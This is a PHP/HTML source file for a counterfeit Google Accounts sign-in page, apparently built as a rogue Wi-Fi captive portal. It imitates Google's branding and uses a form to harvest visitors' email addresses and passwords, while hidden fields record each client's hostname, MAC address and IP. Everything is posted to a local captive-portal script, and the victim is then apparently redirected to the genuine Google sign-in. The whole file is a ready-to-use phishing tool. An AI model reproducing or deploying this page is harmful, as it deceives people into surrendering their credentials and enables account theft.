<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html>

  <head>

    <title>Sign in - Google Accounts</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>

    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/img/oc3czvmbvf.png"/>

    <style>

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }

    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">

      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }

    </style>

    <style media="screen and (max-width: 580px)">

      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }

    </style>

  </head>

  <body>

    <div class="container">

      <div class="google-header-bar centered">
        <div class="header content clearfix">
          <img alt="Google" class="logo" src="assets/img/dtnk16mcjo.png">
        </div>
      </div>

      <h1 class="text-center login-title">Sign in with your Google Account</h1>

        <div class="account-wall">

          <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">

          <form method="POST" action="/captiveportal/index.php" class="form-signin" onsubmit="redirect()">
            <input type="text" name="email" class="form-control nofocus noshadow" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
            <input type="password" name="password" class="form-control nofocus noshadow" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="https://accounts.google.com/signin">
            <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
            <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
          </form>

        </div>

            <br><a href="#" class="text-center new-account">Create an account </a>
            <center><br><p class="tagline">One Google Account for everything Google</p>
            <img src="assets/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>

    </div>

  </body>

</html>
